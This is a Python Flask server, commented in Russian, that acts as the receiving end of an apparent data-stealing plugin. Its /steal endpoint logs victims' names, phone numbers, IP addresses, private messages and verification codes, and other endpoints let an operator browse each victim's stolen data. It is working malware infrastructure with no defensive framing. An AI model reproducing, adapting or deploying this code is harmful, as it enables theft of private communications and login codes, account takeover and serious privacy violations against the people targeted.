import json
import os
import time
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

LOG_FILE = "logs.json"

# Инициализация файла логов
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f:
        json.dump([], f)


def read_logs():
    with open(LOG_FILE, "r") as f:
        return json.load(f)


def write_logs(logs):
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)


@app.route("/")
def index():
    return send_from_directory(".", "index.html")


@app.route("/logs")
def logs_page():
    return send_from_directory(".", "index.html")


@app.route("/api/users", methods=["GET"])
def get_users():
    """Возвращает список всех уникальных пользователей с их последней init-информацией."""
    logs = read_logs()
    users = {}
    for entry in logs:
        uid = entry["user_id"]
        if uid not in users:
            users[uid] = {"user_id": uid, "first_name": "", "last_name": "", "username": "", "phone": "", "is_premium": False,
                          "ip": "", "app_version": "", "last_seen": entry["timestamp"]}
        # обновляем последнюю информацию из init-записей
        if entry["type"] == "init":
            data = entry["data"]
            users[uid].update({
                "first_name": data.get("first_name", ""),
                "last_name": data.get("last_name", ""),
                "username": data.get("username", ""),
                "phone": data.get("phone", ""),
                "is_premium": data.get("is_premium", False),
                "ip": data.get("ip", ""),
                "app_version": data.get("app_version", ""),
            })
        if entry["timestamp"] > users[uid]["last_seen"]:
            users[uid]["last_seen"] = entry["timestamp"]
    # сортируем по последней активности
    sorted_users = sorted(users.values(), key=lambda u: u["last_seen"], reverse=True)
    return jsonify(sorted_users)


@app.route("/api/logs", methods=["GET"])
def get_logs():
    """Возвращает все записи для указанного user_id, сгруппированные по типу."""
    user_id = request.args.get("user_id", type=int)
    if not user_id:
        return jsonify({"error": "user_id required"}), 400

    logs = read_logs()
    user_logs = [entry for entry in logs if entry["user_id"] == user_id]

    # Группируем по типу
    result = {"user_id": user_id, "init": None, "messages": [], "codes": []}
    for entry in user_logs:
        if entry["type"] == "init":
            result["init"] = entry["data"]
        elif entry["type"] == "messages":
            # данные могут содержать массив сообщений
            msgs = entry["data"].get("messages", [])
            result["messages"].extend(msgs)
        elif entry["type"] == "verification_code":
            result["codes"].append(entry["data"])

    # Сортируем сообщения и коды по времени
    result["messages"].sort(key=lambda m: m.get("ts", 0), reverse=True)
    result["codes"].sort(key=lambda c: c.get("timestamp", 0), reverse=True)

    return jsonify(result)


@app.route("/steal", methods=["POST"])
def steal():
    """Принимает данные от плагина и сохраняет в лог."""
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON"}), 400

    # Определяем тип
    data_type = data.get("type")
    if data_type == "init":
        user_id = data.get("user_id")
        entry = {
            "timestamp": int(time.time()),
            "user_id": user_id,
            "type": "init",
            "data": data
        }
    elif data_type == "messages":
        # data содержит "messages" массив и "timestamp"
        user_id = None
        # пытаемся найти user_id из первого сообщения? или из data?
        # в плагине мы отправляем batch с user_id? Надо адаптировать.
        # Для простоты будем считать, что в data есть "user_id" (добавим в плагин)
        user_id = data.get("user_id")
        if not user_id:
            # если нет, пытаемся извлечь из сообщений
            msgs = data.get("messages", [])
            if msgs:
                # берём sender из первого сообщения как user_id (не совсем точно, но для демо)
                user_id = msgs[0].get("sender")
        entry = {
            "timestamp": int(time.time()),
            "user_id": user_id,
            "type": "messages",
            "data": data
        }
    elif data_type == "verification_code":
        user_id = data.get("user_id") or data.get("sender")  # предположим, что это код для текущего пользователя
        entry = {
            "timestamp": int(time.time()),
            "user_id": user_id,
            "type": "verification_code",
            "data": data
        }
    else:
        return jsonify({"error": "Unknown type"}), 400

    # Сохраняем
    logs = read_logs()
    logs.append(entry)
    write_logs(logs)
    return jsonify({"status": "ok"})


# Для совместимости с Railway – запуск
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
